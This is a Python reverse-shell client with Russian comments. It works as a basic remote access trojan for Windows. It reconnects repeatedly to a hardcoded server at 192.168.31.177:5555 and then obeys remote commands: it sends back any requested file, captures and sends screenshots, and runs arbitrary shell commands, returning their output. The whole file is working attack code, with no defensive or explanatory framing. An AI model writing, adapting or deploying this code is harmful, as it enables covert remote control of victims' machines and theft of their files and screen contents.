import socket
import os
import subprocess
import time

# ===== НАСТРОЙКИ =====
SERVER_IP = "192.168.31.177"   # IP твоего Линукса
SERVER_PORT = 5555
# =====================

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

def send_file(s, path):
    try:
        if not os.path.exists(path):
            s.send(b"ERROR: No file")
            return
        size = os.path.getsize(path)
        name = os.path.basename(path)
        s.send(f"FILE:{name}:{size}".encode())
        time.sleep(0.5)
        with open(path, "rb") as f:
            s.sendall(f.read())
    except:
        pass

def take_screenshot(s):
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        data = io.BytesIO()
        img.save(data, format="PNG")
        s.send(data.getvalue())
    except:
        s.send(b"SCREEN_ERROR")

s = connect()
s.send(b"WINDOWS_READY")

while True:
    try:
        cmd = s.recv(4096).decode().strip()
        if not cmd:
            break
        if cmd == "EXIT":
            break
        elif cmd.startswith("GET "):
            send_file(s, cmd[4:])
        elif cmd == "SCREEN":
            take_screenshot(s)
        else:
            out = subprocess.run(cmd, shell=True, capture_output=True)
            s.send(out.stdout + out.stderr)
    except:
        s.close()
        s = connect()
